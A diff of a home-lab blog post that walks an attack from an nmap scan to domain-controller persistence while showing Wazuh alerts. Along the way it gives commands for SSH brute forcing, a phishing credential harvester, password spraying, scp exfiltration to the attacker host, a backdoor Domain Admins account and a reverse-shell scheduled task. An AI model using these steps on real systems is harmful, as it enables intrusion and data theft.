@@ -42,20 +42,18 @@ The simulation follows the **Cyber Attack Lifecycle**, where each phase naturall
 
 ## The Scenario
 
-Our attacker is financially motivated, targeting Project X to steal proprietary files and credentials. They're operating from the Kali Linux machine (`project-x-attacker`, `10.0.0.50`), treating `project-x-corp-svr` as if it were internet-facing.
+Our attacker is financially motivated, targeting Project X to steal proprietary files and credentials. They're operating from the Kali Linux machine (`project-x-attacker`, `10.0.0.50`), treating `project-x-corp-server` as if it were internet-facing.
 
 | | |
 |---|---|
 | 🧠 **Attacker Motive** | Financially Motivated |
 | 🏆 **Goal** | Exfiltrate sensitive data and maintain persistent access |
 
----
+## Phase 1 - Reconnaissance
 
-## Phase 1 — Reconnaissance
+**VMs Required:** `project-x-sec-box`, `project-x-corp-server`, `project-x-attacker`
 
-**VMs Required:** `project-x-sec-box`, `project-x-corp-svr`, `project-x-attacker`
-
-Reconnaissance is about gathering as much information as possible before touching anything. The goal is to map the target's systems and identify potential entry points — without triggering any alarms.
+Reconnaissance is about gathering as much information as possible before touching anything. The goal is to map the target's systems and identify potential entry points - without triggering any alarms.
 
 On the attacker machine, we run an Nmap scan across the network:
 
@@ -63,19 +61,19 @@ On the attacker machine, we run an Nmap scan across the network:
 nmap -p1-1000 -Pn -sV 10.0.0.8/24
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing the full `nmap` scan output with `10.0.0.8` returning open ports — specifically port 22 (SSH) with the service version visible. This is the first piece of intelligence gathered on the target.
+![`nmap` scanning output with `10.0.0.8` returning open ports, specifically port 22 (SSH) with the service version visible. This is the first piece of intelligence gathered on the target.](screenshot1.png)
 
-The results reveal that `10.0.0.8` (`project-x-corp-svr`) is up and running **SSH on port 22**. We don't yet know what kind of server this is — a jumphost, a license server, or something else entirely. But SSH is open, and that's enough to proceed.
+The results reveal that `10.0.0.8` (`project-x-corp-server`) is up and running **SSH on port 22**. We don't yet know what kind of server this is - a jumphost, a license server, or something else entirely. But SSH is open, and that's enough to proceed.
 
 ### Brute-Forcing SSH with Hydra
 
-We use Hydra with the `rockyou.txt` wordlist — a dictionary of millions of commonly used passwords that ships with Kali:
+We use Hydra with the `rockyou.txt` wordlist - a dictionary of millions of commonly used passwords that ships with Kali:
 
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing the Hydra brute-force command running and then returning a successful hit — the output line showing `[22][ssh] host: 10.0.0.8   login: root   password: november` highlighted or visible clearly.
+![Hydra brute-force command running and then returning a successful hit, the output line showing `[22][ssh], host: 10.0.0.8, login: root, password: november`.](screenshot2.png)
 
 After a few minutes, Hydra returns a hit. We log in:
 
@@ -84,19 +82,17 @@ ssh root@10.0.0.8
 # password: november
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing the `ssh root@10.0.0.8` command followed by the successful SSH login banner and shell prompt — confirming we are now inside the corporate server as root.
+![the `ssh root@10.0.0.8` command followed by the successful SSH login banner and shell prompt, confirming we are now inside the corporate server as root.](screenshot3.png)
 
 We're in. Reconnaissance has transitioned directly into initial access.
 
----
+## Phase 2 - Initial Access
 
-## Phase 2 — Initial Access
+**VMs Required:** `project-x-sec-box`, `project-x-corp-server`, `project-x-attacker`, `project-x-linux-client`
 
-**VMs Required:** `project-x-sec-box`, `project-x-corp-svr`, `project-x-attacker`, `project-x-linux-client`
+Initial access means establishing a foothold. We've already broken into the corporate server - now we need to understand what it is and what else we can reach from here.
 
-Initial access means establishing a foothold. We've already broken into the corporate server — now we need to understand what it is and what else we can reach from here.
-
-### Post-Compromise Reconnaissance on `project-x-corp-svr`
+### Post-Compromise Reconnaissance on project-x-corp-server
 
 ```bash
 cat /etc/os-release     # OS version and distro
@@ -108,7 +104,7 @@ ls -la /home            # check user directories
 find / -name "password" 2>/dev/null   # hunt for credential files
 ```
 
-> 📸 **Screenshot suggestion:** Terminal inside the SSH session on `project-x-corp-svr` showing the output of `netstat -tuln` with port 1025 (SMTP/MailHog) and 8025 (MailHog web interface) visible in the listening services list — this is the key discovery that leads to the phishing vector.
+![Terminal inside the SSH session on `project-x-corp-server` showing the output of `netstat -tuln` with port 1025 (SMTP/MailHog) and 8025 (MailHog web interface) visible in the listening services list, this is the key discovery that leads to the phishing vector.](screenshot4.png)
 
 One finding stands out: **SMTP port 1025 is listening**. Querying the MailHog API directly:
 
@@ -116,15 +112,14 @@ One finding stands out: **SMTP port 1025 is listening**. Querying the MailHog AP
 curl http://10.0.0.8:8025/api/v2/messages
 ```
 
-> 📸 **Screenshot suggestion:** Terminal showing the `curl` command output returning a JSON response from the MailHog API — with the email fields visible, including `To: janed@linux-client` as the recipient address. This is the moment the attacker identifies their phishing target.
+![Terminal showing the `curl` command output returning a JSON response from the MailHog API with the email fields visible, including `To: janed@linux-client` as the recipient address. This is the moment the attacker identifies their phishing target.](screenshot5.png)
 
-We find an email in the inbox addressed to `janed@linux-client`. That's a user on the internal network. We now have a target for a phishing campaign.
+![We find an email in the inbox addressed to `janed@linux-client`. That's a user on the internal network. We now have a target for a phishing campaign.](screenshot6.png)
 
----
 
 ### Setup the Phish
 
-On the attacker machine, we set up a credential-harvesting website — a fake "password verification" page that logs whatever a user types in:
+On the attacker machine, we set up a credential-harvesting website - a fake "password verification" page that logs whatever a user types in:
 
 ```bash
 cd /var/www/html
@@ -134,15 +129,13 @@ sudo chmod 666 /var/www/html/creds.log
 sudo service apache2 start
 ```
 
-> 📸 **Screenshot suggestion:** Kali browser showing the fake credential-harvesting login page at `http://localhost` — displaying the spoofed ProjectX login form with username and password fields. This visually demonstrates what Jane will see when she clicks the phishing link.
+![Kali browser showing the fake credential-harvesting login page at `http://localhost` displaying the spoofed ProjectX login form with username and password fields. This visually demonstrates what Jane will see when she clicks the phishing link.](screenshot7.png)
 
-> 📸 **Screenshot suggestion:** Terminal on the attacker machine showing the contents of `creds.log` after a test submission — displaying a dummy username and password captured from the fake login page, confirming the harvesting works.
-
----
+![Terminal on the attacker machine showing the contents of `creds.log` after a test submission, displaying a dummy username and password captured from the fake login page, confirming the harvesting works.](screenshot8.png)
 
 ### Send the Phishing Email
 
-From the SSH session on `project-x-corp-svr`, we create a Python script that sends a phishing email impersonating the ProjectX Security Team, with a link pointing back to our attacker machine at `10.0.0.50`:
+From the SSH session on `project-x-corp-server`, we create a Python script that sends a phishing email impersonating the ProjectX Security Team, with a link pointing back to our attacker machine at `10.0.0.50`:
 
 ```python
 import smtplib
@@ -174,19 +167,13 @@ with smtplib.SMTP("localhost", 1025) as server:
 sudo python3 send_email.py
 ```
 
-> 📸 **Screenshot suggestion:** nano editor on `project-x-corp-svr` showing the `send_email.py` script open, with the `To: janed@linux-client` and the `href='http://10.0.0.50'` phishing link clearly visible in the HTML content block.
-
-> 📸 **Screenshot suggestion:** Terminal on `project-x-corp-svr` showing `sudo python3 send_email.py` executing with no errors, confirming the email was sent to MailHog successfully.
-
----
-
 ### The Phish Lands
 
 On `project-x-linux-client`, the email poller picks up the new message from MailHog and alerts the terminal. Jane sees the notification and clicks the link.
 
-> 📸 **Screenshot suggestion:** Terminal on `project-x-linux-client` showing the `email_poller.sh` script printing an alert — something like "New email received!" or the email subject "Update Password!" appearing in the output, simulating Jane's inbox notification.
+![Terminal on `project-x-linux-client` showing the `email_poller.sh` script printing an alert - something like "New email received!" or the email subject "Update Password!" appearing in the output, simulating Jane's inbox notification.](screenshot9.png)
 
-> 📸 **Screenshot suggestion:** Kali browser showing the fake login page with Jane's credentials typed into the form fields (use dummy credentials for the screenshot) just before she hits submit.
+![Kali browser showing the fake login page with Jane's credentials typed into the form fields (use dummy credentials for the screenshot) just before she hits submit.](screenshot10.png)
 
 Going back to the attacker machine:
 
@@ -194,7 +181,7 @@ Going back to the attacker machine:
 cat /var/www/html/creds.log
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing `cat creds.log` output with Jane's captured credentials visible — `janed` and `@password123!` — this is the payoff screenshot of the phishing phase.
+![Kali terminal showing `cat creds.log` output with Jane's captured credentials visible - `janed` and `@password123!`, this is the payoff screenshot of the phishing phase.](screenshot11.png)
 
 We use those credentials to SSH into the Linux client:
 
@@ -202,11 +189,9 @@ We use those credentials to SSH into the Linux client:
 ssh janed@10.0.0.101
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing `ssh janed@10.0.0.101` completing successfully and landing on the `project-x-linux-client` shell prompt — two machines now compromised.
+![Kali terminal showing `ssh jane@10.0.0.101` completing successfully and landing on the `project-x-linux-client` shell prompt - two machines now compromised.](screenshot12.png)
 
----
-
-## Phase 3 — Lateral Movement + Privilege Escalation
+## Phase 3 - Lateral Movement + Privilege Escalation
 
 **VMs Required:** `project-x-sec-box`, `project-x-linux-client`, `project-x-win-client`, `project-x-dc`, `project-x-attacker`
 
@@ -216,9 +201,9 @@ From `project-x-linux-client`, we run another Nmap scan to map the rest of the n
 nmap -Pn -p1-65535 -sV 10.0.0.0/24
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing the extended Nmap scan results with `10.0.0.100` returning **ports 5985 and 5986 open** — labelled as WinRM (Windows Remote Management). Highlight or circle these port numbers to draw the reader's attention.
+![Nmap scan results with `10.0.0.100` returning **ports 5985 and 5986 open** - labelled as WinRM (Windows Remote Management).](screenshot13.png)
 
-Ports 5985 and 5986 are open on `10.0.0.100` — those are WinRM ports. WinRM is a legitimate Windows administration protocol that is commonly abused for lateral movement and remains highly relevant in today's threat landscape.
+Ports 5985 and 5986 are open on `10.0.0.100` - those are WinRM ports. WinRM is a legitimate Windows administration protocol that is commonly abused for lateral movement and remains highly relevant in today's threat landscape.
 
 ### Password Spraying with NetExec
 
@@ -236,7 +221,7 @@ Administrator
 nxc winrm 10.0.0.100 -u users.txt -p pass.txt
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing the `nxc winrm` command output returning a successful hit — the green `[+] 10.0.0.100 Administrator:@Deeboodah1! (Pwn3d!)` line confirming the credential spray worked.
+![`nxc winrm` command output returning a successful hit, the green `[+] 10.0.0.100 Administrator:@Deeboodah1! (Pwn3d!)` line confirming the credential spray worked.](screenshot14.png)
 
 ### Establishing a Shell with Evil-WinRM
 
@@ -244,15 +229,13 @@ nxc winrm 10.0.0.100 -u users.txt -p pass.txt
 evil-winrm -I 10.0.0.100 -u Administrator -p @Deeboodah1!
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal showing the `evil-winrm` session successfully established — the Evil-WinRM banner and the `*Evil-WinRM* PS C:\Users\Administrator\Documents>` prompt confirming we have a live PowerShell session on `project-x-win-client` as Administrator.
+![`evil-winrm` session has successfully established, the Evil-WinRM banner confirming we have a live PowerShell session on `project-x-win-client` as Administrator.](screenshot15.png)
 
 We now have a PowerShell session on `project-x-win-client` as Administrator. Privilege escalation achieved.
 
-> 📸 **Screenshot suggestion:** Wazuh dashboard showing a **WinRM Logon alert** triggered — the "WinRM Logon" monitor we created in Part 2 firing with the Kerberos Event ID 4624 log visible, showing the alert working as designed from the blue team side.
+![A WinRM Logon alert has triggered - the "WinRM Logon" monitor we created in Part 2 firing with the Kerberos Event ID 4624 log visible, showing the alert working as designed from the blue team side.](screenshot16.png)
 
----
-
-## Phase 4 — Lateral Movement 2.0 (Pivoting to the Domain Controller)
+## Phase 4 - Lateral Movement 2.0 (Pivoting to the Domain Controller)
 
 **VMs Required:** `project-x-sec-box`, `project-x-win-client`, `project-x-dc`, `project-x-attacker`
 
@@ -262,7 +245,7 @@ From inside the Windows client session, we check what domain this workstation be
 nltest /dsgetdc:
 ```
 
-> 📸 **Screenshot suggestion:** Evil-WinRM PowerShell session showing the output of `nltest /dsgetdc:` — returning the domain name `corp.project-x-dc.com` and the DC IP address `10.0.0.5`.
+![Evil-WinRM PowerShell session showing the output of `nltest /dsgetdc:` which returns the domain name `corp.project-x-dc.com` and the DC IP address `10.0.0.5`.](screenshot17.png)
 
 The domain controller is at `10.0.0.5` and port **3389 (RDP)** is open. Since we have valid Administrator credentials, we try RDP from the attacker machine using XFreeRDP:
 
@@ -270,17 +253,15 @@ The domain controller is at `10.0.0.5` and port **3389 (RDP)** is open. Since we
 xfreerdp /v:10.0.0.5 /u:Administrator /p:@Deeboodah1! /d:corp.project-x-dc.com
 ```
 
-> 📸 **Screenshot suggestion:** The RDP session window opening on the Kali desktop — showing the Windows Server 2025 desktop of `project-x-dc` logged in as Administrator. This is the "keys to the kingdom" moment visually.
+![The RDP session window opening on the Kali desktop - showing the Windows Server 2025 desktop of `project-x-dc` logged in as Administrator. This is the "keys to the kingdom" moment visually.](screenshot18.png)
 
 We're now on the **Domain Controller**. Browsing the file system, we find exactly what we're after inside `C:\Users\Administrator\Documents\ProductionFiles\secrets.txt`.
 
-> 📸 **Screenshot suggestion:** Windows File Explorer on the RDP session inside `project-x-dc`, showing `secrets.txt` open in Notepad with its contents visible — confirming the sensitive file has been located.
+![Windows File Explorer on the RDP session inside `project-x-dc`, showing `secrets.txt` open in Notepad with its contents visible, confirming the sensitive file has been located.](screenshot19.png)
 
-> 📸 **Screenshot suggestion:** Wazuh **File Integrity Monitoring → Events** tab showing a FIM event triggered for `secrets.txt` — with the rule description "File integrity monitoring alert" appearing in the alert list.
+![A FIM event triggered for `secrets.txt` - with the rule description "File integrity monitoring alert" appearing in the alert list.](screenshot20.png)
 
----
-
-## Phase 5 — Data Exfiltration
+## Phase 5 - Data Exfiltration
 
 **VMs Required:** `project-x-sec-box`, `project-x-dc`, `project-x-attacker`
 
@@ -290,15 +271,13 @@ With access to the domain controller and the file located, we use `scp` to copy 
 scp ".\secrets.txt" attacker@10.0.0.50:/home/attacker/my_sensitive_file.txt
 ```
 
-> 📸 **Screenshot suggestion:** Terminal inside the RDP session on `project-x-dc` showing the `scp` command executing and completing — with the transfer progress or success message visible, and the attacker's IP `10.0.0.50` visible in the command.
+![Terminal inside the RDP session on `project-x-dc` showing the `scp` command executing and completing](screenshot21.png)
 
-> 📸 **Screenshot suggestion:** Kali terminal showing `cat /home/attacker/my_sensitive_file.txt` — displaying the contents of the exfiltrated `secrets.txt` file successfully received on the attacker machine.
+![The contents of the exfiltrated `secrets.txt` file successfully received on the attacker machine.](screenshot22.png)
 
-> 📸 **Screenshot suggestion:** Wazuh Alerting page showing the **"File Accessed"** alert in an active/triggered state — confirming the SIEM caught the file access on the DC side.
+![**"File Accessed"** alert in an active/triggered state, confirming the SIEM caught the file access on the DC side.](screenshot23.png)
 
----
-
-## Phase 6 — Persistence
+## Phase 6 - Persistence
 
 **VMs Required:** `project-x-sec-box`, `project-x-dc`, `project-x-attacker`
 
@@ -315,18 +294,16 @@ net group "Domain Admins" project-x-user /add
 net user project-x-user /domain
 ```
 
-> 📸 **Screenshot suggestion:** Terminal inside the DC session showing the output of `net user project-x-user /domain` — confirming the new account exists, listing its group memberships including `Domain Admins` and `Administrators`.
+![Terminal inside the DC session confirming the new account exists, listing its group memberships including `Domain Admins` and `Administrators`.](screenshot24.png)
 
-> 📸 **Screenshot suggestion:** Active Directory Users and Computers (ADUC) on `project-x-dc` showing `project-x-user` listed under the Users container — a visual confirmation from the admin side that the rogue account now exists in the domain.
-
----
+![Active Directory Users and Computers (ADUC) on `project-x-dc` showing `project-x-user` listed under the Users container - a visual confirmation from the admin side that the rogue account now exists in the domain.](screenshot25.png)
 
 ### Scheduled Task with Reverse Shell
 
 We create a basic PowerShell reverse shell script (`reverse.ps1`) on the attacker machine, host it with a Python HTTP server, and download it onto the domain controller:
 
 ```bash
-# On attacker machine — create the reverse shell script
+# On attacker machine - create the reverse shell script
 sudo nano reverse.ps1
 ```
 
@@ -377,28 +354,22 @@ Set-ExecutionPolicy Unrestricted -Scope Process
 .\reverse.ps1
 ```
 
-> 📸 **Screenshot suggestion:** Kali terminal split between two panels — left showing `nc -lvnp 4444` (the listener waiting), right showing the reverse shell connection established with the message "Connected to reverse shell!" and a Windows prompt appearing. This is the climax screenshot of the entire simulation.
+![Kali showing `nc -lvnp 4444` (the listener waiting) and the reverse shell connection established with the message "Connected to reverse shell!" and a Windows prompt appearing.](screenshot26.png)
 
-> 📸 **Screenshot suggestion:** Windows Task Scheduler on `project-x-dc` (open via `taskschd.msc`) showing `PersistenceTask` listed in the Task Scheduler Library — confirming the scheduled task was created and will run `reverse.ps1` daily at 12:00.
+![Windows Task Scheduler on `project-x-dc` showing `PersistenceTask` listed in the Task Scheduler Library - confirming the scheduled task was created and will run `reverse.ps1` daily at 12:00.](screenshot27.png)
 
----
+## Phase 7 - Defense Evasion
 
-## Phase 7 — Defense Evasion
-
-At this stage, a real attacker would work to cover their tracks — clearing event logs, obfuscating the backdoor account name, disabling endpoint security controls, or removing indicators of compromise from the SIEM. In this lab, the focus has been on demonstrating how each stage of the attack creates a detectable footprint in Wazuh. Defense evasion techniques are a topic for a dedicated future write-up.
-
----
+At this stage, a real attacker would work to cover their tracks - clearing event logs, obfuscating the backdoor account name, disabling endpoint security controls, or removing indicators of compromise from the SIEM. In this lab, the focus has been on demonstrating how each stage of the attack creates a detectable footprint in Wazuh. Defense evasion techniques are a topic for a dedicated future write-up.
 
 ## Conclusion
 
-And that completes the full lifecycle — from reconnaissance through to persistence.
+And that completes the full lifecycle - from reconnaissance through to persistence.
 
-Is this a perfect replica of a real-world attack? No — in reality, the attacker's machine would never sit on the same subnet as the target, and modern enterprise environments are far better hardened than what we've configured here. But that's not the point.
+Is this a perfect replica of a real-world attack? No - in reality, the attacker's machine would never sit on the same subnet as the target, and modern enterprise environments are far better hardened than what we've configured here. But that's not the point.
 
 The value of an exercise like this is developing an intuition for **how attacks chain together**, why misconfigurations matter, and how defensive tools like Wazuh create visibility at each phase. Every command run left a log somewhere. Every lateral movement generated an authentication event. Every file access triggered a FIM alert.
 
 That's the lesson: **attackers leave footprints. It's our job to know where to look.**
-
----
 
 *Stay tuned for future posts where I'll explore more advanced network attack scenarios, cloud security labs, and deeper SIEM analysis.*
